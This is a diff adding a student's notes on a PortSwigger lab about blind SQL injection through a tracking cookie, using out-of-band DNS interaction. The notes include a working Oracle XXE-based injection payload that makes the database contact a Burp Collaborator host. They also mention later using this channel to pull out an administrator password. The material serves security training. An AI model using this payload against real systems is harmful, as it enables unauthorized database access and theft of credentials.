@@ -1,0 +1,37 @@
+Lab 15 - Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goal: Exploit SQLi and cause a DNS lookup
+
+NOTE:
+
+- The SQL query is executed asynchronously and has no effect on the app's response.
+- However, we can trigger out-of-band (OAST) interactions with an external domain.
+
+- This means that even if the app is vulnerable and if we successfully attack the app,
+the app won't send us a useful response that will indicate that our attack is successfully.
+- However, since we can trigger an out-of-band interaction with an external domain, it means we can
+use an out-of-band SQL injection to exploit this vulnerability and know that our attack was successfully.
+
+- So, triggering an out-of-band interaction means that we send an attack payload that causes an interaction
+with an external system that we have full control of.
+
+- And since we have full control of the system, when we run our attack, we can see the response
+that we triggered and therefore we know that we've successfully exploited the SQL injection.
+
+i.e.: if your attack was successful, send a 200 response to some other machine.
+
+NOTE: This lab requires Burp Collaborator for DNS lookup.
+
+========================================================================================================================
+Analysis:
+
+Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+<BURP-COLLABORATOR-SUBDOMAIN/>.burpcollaborator.net
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+
+- For this lab, we are just performing a DNS lookup using Burp Collaborator.
+- In the next lab, we will use this DNS lookup to output the administrator password.
